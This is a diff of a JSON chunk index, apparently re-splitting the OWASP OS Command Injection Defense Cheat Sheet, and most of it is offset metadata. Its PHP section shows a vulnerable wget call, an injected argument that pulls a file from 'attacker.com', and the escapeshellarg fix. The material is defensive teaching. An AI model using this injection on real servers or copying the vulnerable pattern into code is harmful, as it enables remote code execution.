+      "text_content": "PHP exposes two helper functions when you must pass user input to a shell: `escapeshellarg()` and `escapeshellcmd()`.\n\n`escapeshellarg()`: Ensures the user can pass only one parameter to the command, cannot add extra parameters, and cannot execute a different command.\n\n`escapeshellcmd()`: Ensures the user can execute only the intended command, can pass unlimited parameters, but cannot execute other commands.\n\nIt is always preferable to use `escapeshellarg()` rather than `escapeshellcmd()` when dealing with user input.\n\nFor example, consider this code using `wget` with `escapeshellcmd()`:",
+      "token_count": 125,
+      "chunk_strategy": "structure_aware",
+      "heading_path": [
+        "OS Command Injection Defense Cheat Sheet",
+        "Code examples",
+        "PHP"
+      ]
+    },
+    {
+      "chunk_id": "ver_b497005071ae_c00041",
+      "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+      "version_id": "ver_b497005071ae",
+      "chunk_idx": 41,
+      "chunk_type": "code",
+      "text_content": "```php\n$url = $_GET['url'];\n$command = 'wget --directory-prefix=..\\temp ' . $url;\nsystem(escapeshellcmd($command));\n```",
+      "token_count": 47,
+      "chunk_strategy": "structure_aware",
+      "heading_path": [
+        "OS Command Injection Defense Cheat Sheet",
+        "Code examples",
+        "PHP"
+      ]
+    },
+    {
+      "chunk_id": "ver_b497005071ae_c00042",
+      "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+      "version_id": "ver_b497005071ae",
+      "chunk_idx": 42,
+      "chunk_type": "paragraph",
+      "text_content": "If the user provides:",
+      "token_count": 5,
+      "chunk_strategy": "structure_aware",
+      "heading_path": [
+        "OS Command Injection Defense Cheat Sheet",
+        "Code examples",
+        "PHP"
+      ]
+    },
+    {
+      "chunk_id": "ver_b497005071ae_c00043",
+      "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+      "version_id": "ver_b497005071ae",
+      "chunk_idx": 43,
+      "chunk_type": "code",
+      "text_content": "```text\nhttp://victim.com/download.php?url=--directory-prefix=. http://attacker.com/malicious.php\n```",
+      "token_count": 39,
+      "chunk_strategy": "structure_aware",
+      "heading_path": [
+        "OS Command Injection Defense Cheat Sheet",
+        "Code examples",
+        "PHP"
+      ]
+    },
+    {
+      "chunk_id": "ver_b497005071ae_c00044",
+      "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+      "version_id": "ver_b497005071ae",
+      "chunk_idx": 44,
+      "chunk_type": "paragraph",
+      "text_content": "`escapeshellcmd()` will still allow this extra parameter meaning the attacker can override the original `--directory-prefix` option, save the file in the current directory and then achieve remote command execution on the server.\n\nThe safe approach is to use `escapeshellarg()` so that the URL is treated as a single argument:",
+      "token_count": 66,
+      "chunk_strategy": "structure_aware",
+      "heading_path": [
+        "OS Command Injection Defense Cheat Sheet",
+        "Code examples",
+        "PHP"
+      ]
+    },
+    {
+      "chunk_id": "ver_b497005071ae_c00045",
+      "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+      "version_id": "ver_b497005071ae",
+      "chunk_idx": 45,
+      "chunk_type": "code",
+      "text_content": "```php\n$url = $_GET['url'];\n$command = 'wget --directory-prefix=..\\temp ' . escapeshellarg($url);\nsystem($command);\n```",
+      "token_count": 47,
+      "chunk_strategy": "structure_aware",
+      "heading_path": [
+        "OS Command Injection Defense Cheat Sheet",
+        "Code examples",
+        "PHP"
+      ]
+    },
+    {
+      "chunk_id": "ver_b497005071ae_c00046",
+      "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+      "version_id": "ver_b497005071ae",
+      "chunk_idx": 46,
+      "chunk_type": "paragraph",
+      "text_content": "Now the malicious input becomes:",
+      "token_count": 6,
+      "chunk_strategy": "structure_aware",
+      "heading_path": [
+        "OS Command Injection Defense Cheat Sheet",
+        "Code examples",
+        "PHP"
+      ]
+    },
+    {
+      "chunk_id": "ver_b497005071ae_c00047",
+      "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+      "version_id": "ver_b497005071ae",
+      "chunk_idx": 47,
+      "chunk_type": "code",
+      "text_content": "```text\nwget --directory-prefix=..\\temp '--directory-prefix=. http://attacker.com/malicious.php'\n```",
+      "token_count": 38,
+      "chunk_strategy": "structure_aware",
+      "heading_path": [
+        "OS Command Injection Defense Cheat Sheet",
+        "Code examples",
+        "PHP"
+      ]
+    },
+    {
+      "chunk_id": "ver_b497005071ae_c00048",
+      "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+      "version_id": "ver_b497005071ae",
+      "chunk_idx": 48,
       "chunk_type": "mixed",
-      "text_content": "PHP exposes two helper functions when you must pass user input to a shell: `escapeshellarg()` and `escapeshellcmd()`.\n\n`escapeshellarg()`: Ensures the user can pass only one parameter to the command, cannot add extra parameters, and cannot execute a different command.\n\n`escapeshellcmd()`: Ensures the user can execute only the intended command, can pass unlimited parameters, but cannot execute other commands.\n\nIt is always preferable to use `escapeshellarg()` rather than `escapeshellcmd()` when dealing with user input.\n\nFor example, consider this code using `wget` with `escapeshellcmd()`:\n\n```php\n$url = $_GET['url'];\n$command = 'wget --directory-prefix=..\\temp ' .\n\n$url;\nsystem(escapeshellcmd($command));\n```\n\nIf the user provides:\n\n```text\nhttp://victim.com/download.php?url=--directory-prefix=.\n\nhttp://attacker.com/malicious.php\n```\n\n`escapeshellcmd()` will still allow this extra parameter meaning the attacker can override the original `--directory-prefix` option, save the file in the current directory and then achieve remote command execution on the server.\n\nThe safe approach is to use `escapeshellarg()` so that the URL is treated as a single argument:\n\n```php\n$url = $_GET['url'];\n$command = 'wget --directory-prefix=..\\temp ' .\n\nescapeshellarg($url);\nsystem($command);\n```\n\nNow the malicious input becomes:\n\n```text\nwget --directory-prefix=..\\temp '--directory-prefix=.\n\nhttp://attacker.com/malicious.php'\n```\n\nHere, the second `--directory-prefix` is part of the quoted string, not a real option, so the attack fails.\n\nIn addition, it is good security practice to follow these recommendations:\n\n- **Hardcode the command**: never allow the user to choose which executable to run.",
-      "token_count": 434,
+      "text_content": "Here, the second `--directory-prefix` is part of the quoted string, not a real option, so the attack fails.\n\nIn addition, it is good security practice to follow these recommendations:\n\n- **Hardcode the command**: never allow the user to choose which executable to run.\n\n- **Hardcode options**: required flags (e.g., `--directory-prefix`) should be in the code, not in user input.\n\n- **Validate and restrict input as much as possible**: apply strict validation rules, whitelists, and format checks to minimize the attack surface.",
+      "token_count": 126,
       "chunk_strategy": "structure_aware",
       "heading_path": [
         "OS Command Injection Defense Cheat Sheet",
@@ -405,25 +732,10 @@
       ]
     },
     {
-      "chunk_id": "ver_b497005071ae_c00027",
+      "chunk_id": "ver_b497005071ae_c00049",
       "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
       "version_id": "ver_b497005071ae",
-      "chunk_idx": 27,
-      "chunk_type": "list",
-      "text_content": "- **Hardcode options**: required flags (e.g., `--directory-prefix`) should be in the code, not in user input.\n\n- **Validate and restrict input as much as possible**: apply strict validation rules, whitelists, and format checks to minimize the attack surface.",
-      "token_count": 65,
-      "chunk_strategy": "structure_aware",
-      "heading_path": [
-        "OS Command Injection Defense Cheat Sheet",
-        "Code examples",
-        "PHP"
-      ]
-    },
-    {
-      "chunk_id": "ver_b497005071ae_c00028",
-      "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
-      "version_id": "ver_b497005071ae",
-      "chunk_idx": 28,
+      "chunk_idx": 49,
       "chunk_type": "heading",
       "text_content": "## References",
       "token_count": 3,
@@ -434,10 +746,10 @@
       ]
     },
     {
-      "chunk_id": "ver_b497005071ae_c00029",
+      "chunk_id": "ver_b497005071ae_c00050",
       "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
       "version_id": "ver_b497005071ae",
-      "chunk_idx": 29,
+      "chunk_idx": 50,
       "chunk_type": "list",
       "text_content": "- [SEI CERT C: Do not call system()](https://cmu-sei.github.io/secure-coding-standards/sei-cert-c-coding-standard/rules/environment-env/env33-c/)\n- [CWE-77: Command Injection](https://cwe.mitre.org/data/definitions/77.html)",
       "token_count": 81,
@@ -482,1056 +794,888 @@
       "end_offset": 38
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00002_s002",
-      "chunk_id": "ver_b497005071ae_c00002",
+      "chunk_source_id": "ver_b497005071ae_c00003_s000",
+      "chunk_id": "ver_b497005071ae_c00003",
       "normalized_block_id": "nrm_ver_b497005071ae_b00004",
-      "source_order": 2,
+      "source_order": 0,
       "start_offset": 0,
       "end_offset": 18
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00002_s003",
-      "chunk_id": "ver_b497005071ae_c00002",
+      "chunk_source_id": "ver_b497005071ae_c00004_s000",
+      "chunk_id": "ver_b497005071ae_c00004",
       "normalized_block_id": "nrm_ver_b497005071ae_b00005",
-      "source_order": 3,
+      "source_order": 0,
       "start_offset": 0,
       "end_offset": 82
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00002_s004",
-      "chunk_id": "ver_b497005071ae_c00002",
+      "chunk_source_id": "ver_b497005071ae_c00004_s001",
+      "chunk_id": "ver_b497005071ae_c00004",
       "normalized_block_id": "nrm_ver_b497005071ae_b00006",
-      "source_order": 4,
+      "source_order": 1,
       "start_offset": 0,
       "end_offset": 69
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00002_s005",
-      "chunk_id": "ver_b497005071ae_c00002",
+      "chunk_source_id": "ver_b497005071ae_c00005_s000",
+      "chunk_id": "ver_b497005071ae_c00005",
       "normalized_block_id": "nrm_ver_b497005071ae_b00007",
-      "source_order": 5,
+      "source_order": 0,
       "start_offset": 0,
       "end_offset": 32
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00002_s006",
-      "chunk_id": "ver_b497005071ae_c00002",
+      "chunk_source_id": "ver_b497005071ae_c00006_s000",
+      "chunk_id": "ver_b497005071ae_c00006",
       "normalized_block_id": "nrm_ver_b497005071ae_b00008",
-      "source_order": 6,
+      "source_order": 0,
       "start_offset": 0,
       "end_offset": 68
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00002_s007",
-      "chunk_id": "ver_b497005071ae_c00002",
+      "chunk_source_id": "ver_b497005071ae_c00006_s001",
+      "chunk_id": "ver_b497005071ae_c00006",
       "normalized_block_id": "nrm_ver_b497005071ae_b00009",
-      "source_order": 7,
+      "source_order": 1,
       "start_offset": 0,
       "end_offset": 74
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00002_s008",
-      "chunk_id": "ver_b497005071ae_c00002",
+      "chunk_source_id": "ver_b497005071ae_c00006_s002",
+      "chunk_id": "ver_b497005071ae_c00006",
       "normalized_block_id": "nrm_ver_b497005071ae_b00010",
-      "source_order": 8,
+      "source_order": 2,
       "start_offset": 0,
       "end_offset": 88
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00002_s009",
-      "chunk_id": "ver_b497005071ae_c00002",
+      "chunk_source_id": "ver_b497005071ae_c00006_s003",
+      "chunk_id": "ver_b497005071ae_c00006",
       "normalized_block_id": "nrm_ver_b497005071ae_b00011",
-      "source_order": 9,
+      "source_order": 3,
       "start_offset": 0,
       "end_offset": 218
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00003_s000",
-      "chunk_id": "ver_b497005071ae_c00003",
+      "chunk_source_id": "ver_b497005071ae_c00007_s000",
+      "chunk_id": "ver_b497005071ae_c00007",
       "normalized_block_id": "nrm_ver_b497005071ae_b00012",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 22
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00004_s000",
-      "chunk_id": "ver_b497005071ae_c00004",
+      "chunk_source_id": "ver_b497005071ae_c00008_s000",
+      "chunk_id": "ver_b497005071ae_c00008",
       "normalized_block_id": "nrm_ver_b497005071ae_b00013",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 57
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00004_s001",
-      "chunk_id": "ver_b497005071ae_c00004",
+      "chunk_source_id": "ver_b497005071ae_c00008_s001",
+      "chunk_id": "ver_b497005071ae_c00008",
       "normalized_block_id": "nrm_ver_b497005071ae_b00013",
       "source_order": 1,
       "start_offset": 58,
       "end_offset": 156
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00004_s002",
-      "chunk_id": "ver_b497005071ae_c00004",
+      "chunk_source_id": "ver_b497005071ae_c00008_s002",
+      "chunk_id": "ver_b497005071ae_c00008",
       "normalized_block_id": "nrm_ver_b497005071ae_b00014",
       "source_order": 2,
       "start_offset": 0,
       "end_offset": 121
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00004_s003",
-      "chunk_id": "ver_b497005071ae_c00004",
+      "chunk_source_id": "ver_b497005071ae_c00009_s000",
+      "chunk_id": "ver_b497005071ae_c00009",
       "normalized_block_id": "nrm_ver_b497005071ae_b00015",
-      "source_order": 3,
+      "source_order": 0,
       "start_offset": 0,
-      "end_offset": 6
-    },
-    {
-      "chunk_source_id": "ver_b497005071ae_c00004_s004",
-      "chunk_id": "ver_b497005071ae_c00004",
-      "normalized_block_id": "nrm_ver_b497005071ae_b00015",
-      "source_order": 4,
-      "start_offset": 8,
-      "end_offset": 24
-    },
-    {
-      "chunk_source_id": "ver_b497005071ae_c00004_s005",
-      "chunk_id": "ver_b497005071ae_c00004",
-      "normalized_block_id": "nrm_ver_b497005071ae_b00015",
-      "source_order": 5,
-      "start_offset": 25,
       "end_offset": 43
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00004_s006",
-      "chunk_id": "ver_b497005071ae_c00004",
+      "chunk_source_id": "ver_b497005071ae_c00010_s000",
+      "chunk_id": "ver_b497005071ae_c00010",
       "normalized_block_id": "nrm_ver_b497005071ae_b00016",
-      "source_order": 6,
+      "source_order": 0,
       "start_offset": 0,
       "end_offset": 53
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00004_s007",
-      "chunk_id": "ver_b497005071ae_c00004",
+      "chunk_source_id": "ver_b497005071ae_c00010_s001",
+      "chunk_id": "ver_b497005071ae_c00010",
       "normalized_block_id": "nrm_ver_b497005071ae_b00017",
-      "source_order": 7,
+      "source_order": 1,
       "start_offset": 0,
       "end_offset": 97
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00004_s008",
-      "chunk_id": "ver_b497005071ae_c00004",
+      "chunk_source_id": "ver_b497005071ae_c00011_s000",
+      "chunk_id": "ver_b497005071ae_c00011",
       "normalized_block_id": "nrm_ver_b497005071ae_b00018",
-      "source_order": 8,
+      "source_order": 0,
       "start_offset": 0,
-      "end_offset": 6
-    },
-    {
-      "chunk_source_id": "ver_b497005071ae_c00004_s009",
-      "chunk_id": "ver_b497005071ae_c00004",
-      "normalized_block_id": "nrm_ver_b497005071ae_b00018",
-      "source_order": 9,
-      "start_offset": 8,
-      "end_offset": 24
-    },
-    {
-      "chunk_source_id": "ver_b497005071ae_c00004_s010",
-      "chunk_id": "ver_b497005071ae_c00004",
-      "normalized_block_id": "nrm_ver_b497005071ae_b00018",
-      "source_order": 10,
-      "start_offset": 25,
       "end_offset": 46
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00004_s011",
-      "chunk_id": "ver_b497005071ae_c00004",
+      "chunk_source_id": "ver_b497005071ae_c00012_s000",
+      "chunk_id": "ver_b497005071ae_c00012",
       "normalized_block_id": "nrm_ver_b497005071ae_b00019",
-      "source_order": 11,
+      "source_order": 0,
       "start_offset": 0,
       "end_offset": 78
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00004_s012",
-      "chunk_id": "ver_b497005071ae_c00004",
+      "chunk_source_id": "ver_b497005071ae_c00012_s001",
+      "chunk_id": "ver_b497005071ae_c00012",
       "normalized_block_id": "nrm_ver_b497005071ae_b00020",
-      "source_order": 12,
+      "source_order": 1,
       "start_offset": 0,
       "end_offset": 163
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00005_s000",
-      "chunk_id": "ver_b497005071ae_c00005",
+      "chunk_source_id": "ver_b497005071ae_c00013_s000",
+      "chunk_id": "ver_b497005071ae_c00013",
       "normalized_block_id": "nrm_ver_b497005071ae_b00021",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 19
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00006_s000",
-      "chunk_id": "ver_b497005071ae_c00006",
+      "chunk_source_id": "ver_b497005071ae_c00014_s000",
+      "chunk_id": "ver_b497005071ae_c00014",
       "normalized_block_id": "nrm_ver_b497005071ae_b00022",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 56
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00007_s000",
-      "chunk_id": "ver_b497005071ae_c00007",
+      "chunk_source_id": "ver_b497005071ae_c00015_s000",
+      "chunk_id": "ver_b497005071ae_c00015",
       "normalized_block_id": "nrm_ver_b497005071ae_b00023",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 61
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00007_s001",
-      "chunk_id": "ver_b497005071ae_c00007",
+      "chunk_source_id": "ver_b497005071ae_c00015_s001",
+      "chunk_id": "ver_b497005071ae_c00015",
       "normalized_block_id": "nrm_ver_b497005071ae_b00023",
       "source_order": 1,
       "start_offset": 62,
       "end_offset": 218
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00007_s002",
-      "chunk_id": "ver_b497005071ae_c00007",
+      "chunk_source_id": "ver_b497005071ae_c00015_s002",
+      "chunk_id": "ver_b497005071ae_c00015",
       "normalized_block_id": "nrm_ver_b497005071ae_b00024",
       "source_order": 2,
       "start_offset": 0,
       "end_offset": 65
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00007_s003",
-      "chunk_id": "ver_b497005071ae_c00007",
+      "chunk_source_id": "ver_b497005071ae_c00015_s003",
+      "chunk_id": "ver_b497005071ae_c00015",
       "normalized_block_id": "nrm_ver_b497005071ae_b00025",
       "source_order": 3,
       "start_offset": 0,
       "end_offset": 96
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00008_s000",
-      "chunk_id": "ver_b497005071ae_c00008",
+      "chunk_source_id": "ver_b497005071ae_c00016_s000",
+      "chunk_id": "ver_b497005071ae_c00016",
       "normalized_block_id": "nrm_ver_b497005071ae_b00026",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 76
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00009_s000",
-      "chunk_id": "ver_b497005071ae_c00009",
+      "chunk_source_id": "ver_b497005071ae_c00017_s000",
+      "chunk_id": "ver_b497005071ae_c00017",
       "normalized_block_id": "nrm_ver_b497005071ae_b00027",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 103
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00009_s001",
-      "chunk_id": "ver_b497005071ae_c00009",
+      "chunk_source_id": "ver_b497005071ae_c00017_s001",
+      "chunk_id": "ver_b497005071ae_c00017",
       "normalized_block_id": "nrm_ver_b497005071ae_b00028",
       "source_order": 1,
       "start_offset": 0,
       "end_offset": 251
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00009_s002",
-      "chunk_id": "ver_b497005071ae_c00009",
+      "chunk_source_id": "ver_b497005071ae_c00017_s002",
+      "chunk_id": "ver_b497005071ae_c00017",
       "normalized_block_id": "nrm_ver_b497005071ae_b00029",
       "source_order": 2,
       "start_offset": 0,
       "end_offset": 122
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00010_s000",
-      "chunk_id": "ver_b497005071ae_c00010",
+      "chunk_source_id": "ver_b497005071ae_c00018_s000",
+      "chunk_id": "ver_b497005071ae_c00018",
       "normalized_block_id": "nrm_ver_b497005071ae_b00030",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 75
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00011_s000",
-      "chunk_id": "ver_b497005071ae_c00011",
+      "chunk_source_id": "ver_b497005071ae_c00019_s000",
+      "chunk_id": "ver_b497005071ae_c00019",
       "normalized_block_id": "nrm_ver_b497005071ae_b00031",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 165
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00012_s000",
-      "chunk_id": "ver_b497005071ae_c00012",
+      "chunk_source_id": "ver_b497005071ae_c00020_s000",
+      "chunk_id": "ver_b497005071ae_c00020",
       "normalized_block_id": "nrm_ver_b497005071ae_b00032",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 12
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00013_s000",
-      "chunk_id": "ver_b497005071ae_c00013",
+      "chunk_source_id": "ver_b497005071ae_c00021_s000",
+      "chunk_id": "ver_b497005071ae_c00021",
       "normalized_block_id": "nrm_ver_b497005071ae_b00033",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 129
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00013_s001",
-      "chunk_id": "ver_b497005071ae_c00013",
+      "chunk_source_id": "ver_b497005071ae_c00021_s001",
+      "chunk_id": "ver_b497005071ae_c00021",
       "normalized_block_id": "nrm_ver_b497005071ae_b00033",
       "source_order": 1,
       "start_offset": 130,
       "end_offset": 198
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00014_s000",
-      "chunk_id": "ver_b497005071ae_c00014",
+      "chunk_source_id": "ver_b497005071ae_c00022_s000",
+      "chunk_id": "ver_b497005071ae_c00022",
       "normalized_block_id": "nrm_ver_b497005071ae_b00034",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 12
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00015_s000",
-      "chunk_id": "ver_b497005071ae_c00015",
+      "chunk_source_id": "ver_b497005071ae_c00023_s000",
+      "chunk_id": "ver_b497005071ae_c00023",
       "normalized_block_id": "nrm_ver_b497005071ae_b00035",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 98
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00015_s001",
-      "chunk_id": "ver_b497005071ae_c00015",
+      "chunk_source_id": "ver_b497005071ae_c00023_s001",
+      "chunk_id": "ver_b497005071ae_c00023",
       "normalized_block_id": "nrm_ver_b497005071ae_b00035",
       "source_order": 1,
       "start_offset": 99,
       "end_offset": 182
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00015_s002",
-      "chunk_id": "ver_b497005071ae_c00015",
+      "chunk_source_id": "ver_b497005071ae_c00023_s002",
+      "chunk_id": "ver_b497005071ae_c00023",
       "normalized_block_id": "nrm_ver_b497005071ae_b00036",
       "source_order": 2,
       "start_offset": 0,
       "end_offset": 101
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00015_s003",
-      "chunk_id": "ver_b497005071ae_c00015",
+      "chunk_source_id": "ver_b497005071ae_c00023_s003",
+      "chunk_id": "ver_b497005071ae_c00023",
       "normalized_block_id": "nrm_ver_b497005071ae_b00036",
       "source_order": 3,
       "start_offset": 102,
       "end_offset": 316
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00015_s004",
-      "chunk_id": "ver_b497005071ae_c00015",
+      "chunk_source_id": "ver_b497005071ae_c00023_s004",
+      "chunk_id": "ver_b497005071ae_c00023",
       "normalized_block_id": "nrm_ver_b497005071ae_b00036",
       "source_order": 4,
       "start_offset": 321,
       "end_offset": 447
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00015_s005",
-      "chunk_id": "ver_b497005071ae_c00015",
+      "chunk_source_id": "ver_b497005071ae_c00023_s005",
+      "chunk_id": "ver_b497005071ae_c00023",
       "normalized_block_id": "nrm_ver_b497005071ae_b00036",
       "source_order": 5,
       "start_offset": 448,
       "end_offset": 562
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00015_s006",
-      "chunk_id": "ver_b497005071ae_c00015",
+      "chunk_source_id": "ver_b497005071ae_c00023_s006",
+      "chunk_id": "ver_b497005071ae_c00023",
       "normalized_block_id": "nrm_ver_b497005071ae_b00036",
       "source_order": 6,
       "start_offset": 563,
       "end_offset": 687
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00015_s007",
-      "chunk_id": "ver_b497005071ae_c00015",
+      "chunk_source_id": "ver_b497005071ae_c00023_s007",
+      "chunk_id": "ver_b497005071ae_c00023",
       "normalized_block_id": "nrm_ver_b497005071ae_b00036",
       "source_order": 7,
       "start_offset": 688,
       "end_offset": 823
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00015_s008",
-      "chunk_id": "ver_b497005071ae_c00015",
+      "chunk_source_id": "ver_b497005071ae_c00023_s008",
+      "chunk_id": "ver_b497005071ae_c00023",
       "normalized_block_id": "nrm_ver_b497005071ae_b00036",
       "source_order": 8,
       "start_offset": 824,
       "end_offset": 961
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00015_s009",
-      "chunk_id": "ver_b497005071ae_c00015",
+      "chunk_source_id": "ver_b497005071ae_c00023_s009",
+      "chunk_id": "ver_b497005071ae_c00023",
       "normalized_block_id": "nrm_ver_b497005071ae_b00036",
       "source_order": 9,
       "start_offset": 962,
       "end_offset": 1125
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00015_s010",
-      "chunk_id": "ver_b497005071ae_c00015",
+      "chunk_source_id": "ver_b497005071ae_c00023_s010",
+      "chunk_id": "ver_b497005071ae_c00023",
       "normalized_block_id": "nrm_ver_b497005071ae_b00036",
       "source_order": 10,
       "start_offset": 1126,
       "end_offset": 1184
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00015_s011",
-      "chunk_id": "ver_b497005071ae_c00015",
+      "chunk_source_id": "ver_b497005071ae_c00023_s011",
+      "chunk_id": "ver_b497005071ae_c00023",
       "normalized_block_id": "nrm_ver_b497005071ae_b00036",
       "source_order": 11,
       "start_offset": 1185,
       "end_offset": 1320
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00015_s012",
-      "chunk_id": "ver_b497005071ae_c00015",
+      "chunk_source_id": "ver_b497005071ae_c00023_s012",
+      "chunk_id": "ver_b497005071ae_c00023",
       "normalized_block_id": "nrm_ver_b497005071ae_b00037",
       "source_order": 12,
       "start_offset": 0,
       "end_offset": 11
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00015_s013",
-      "chunk_id": "ver_b497005071ae_c00015",
+      "chunk_source_id": "ver_b497005071ae_c00024_s000",
+      "chunk_id": "ver_b497005071ae_c00024",
       "normalized_block_id": "nrm_ver_b497005071ae_b00038",
-      "source_order": 13,
+      "source_order": 0,
       "start_offset": 0,
-      "end_offset": 26
-    },
-    {
-      "chunk_source_id": "ver_b497005071ae_c00015_s014",
-      "chunk_id": "ver_b497005071ae_c00015",
-      "normalized_block_id": "nrm_ver_b497005071ae_b00038",
-      "source_order": 14,
-      "start_offset": 27,
       "end_offset": 38
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00016_s000",
-      "chunk_id": "ver_b497005071ae_c00016",
+      "chunk_source_id": "ver_b497005071ae_c00025_s000",
+      "chunk_id": "ver_b497005071ae_c00025",
       "normalized_block_id": "nrm_ver_b497005071ae_b00039",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 22
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00017_s000",
-      "chunk_id": "ver_b497005071ae_c00017",
+      "chunk_source_id": "ver_b497005071ae_c00026_s000",
+      "chunk_id": "ver_b497005071ae_c00026",
       "normalized_block_id": "nrm_ver_b497005071ae_b00040",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 157
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00017_s001",
-      "chunk_id": "ver_b497005071ae_c00017",
+      "chunk_source_id": "ver_b497005071ae_c00026_s001",
+      "chunk_id": "ver_b497005071ae_c00026",
       "normalized_block_id": "nrm_ver_b497005071ae_b00041",
       "source_order": 1,
       "start_offset": 0,
       "end_offset": 30
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00017_s002",
-      "chunk_id": "ver_b497005071ae_c00017",
+      "chunk_source_id": "ver_b497005071ae_c00026_s002",
+      "chunk_id": "ver_b497005071ae_c00026",
       "normalized_block_id": "nrm_ver_b497005071ae_b00042",
       "source_order": 2,
       "start_offset": 0,
       "end_offset": 106
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00017_s003",
-      "chunk_id": "ver_b497005071ae_c00017",
+      "chunk_source_id": "ver_b497005071ae_c00026_s003",
+      "chunk_id": "ver_b497005071ae_c00026",
       "normalized_block_id": "nrm_ver_b497005071ae_b00042",
       "source_order": 3,
       "start_offset": 107,
       "end_offset": 208
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00018_s000",
-      "chunk_id": "ver_b497005071ae_c00018",
+      "chunk_source_id": "ver_b497005071ae_c00027_s000",
+      "chunk_id": "ver_b497005071ae_c00027",
       "normalized_block_id": "nrm_ver_b497005071ae_b00043",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 16
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00019_s000",
-      "chunk_id": "ver_b497005071ae_c00019",
+      "chunk_source_id": "ver_b497005071ae_c00028_s000",
+      "chunk_id": "ver_b497005071ae_c00028",
       "normalized_block_id": "nrm_ver_b497005071ae_b00044",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 8
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00020_s000",
-      "chunk_id": "ver_b497005071ae_c00020",
+      "chunk_source_id": "ver_b497005071ae_c00029_s000",
+      "chunk_id": "ver_b497005071ae_c00029",
       "normalized_block_id": "nrm_ver_b497005071ae_b00045",
       "source_order": 0,
       "start_offset": 0,
       "end_offset": 156
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00020_s001",
-      "chunk_id": "ver_b497005071ae_c00020",
+      "chunk_source_id": "ver_b497005071ae_c00029_s001",
+      "chunk_id": "ver_b497005071ae_c00029",
       "normalized_block_id": "nrm_ver_b497005071ae_b00046",
       "source_order": 1,
       "start_offset": 0,
       "end_offset": 384
     },
     {
-      "chunk_source_id": "ver_b497005071ae_c00020_s002",
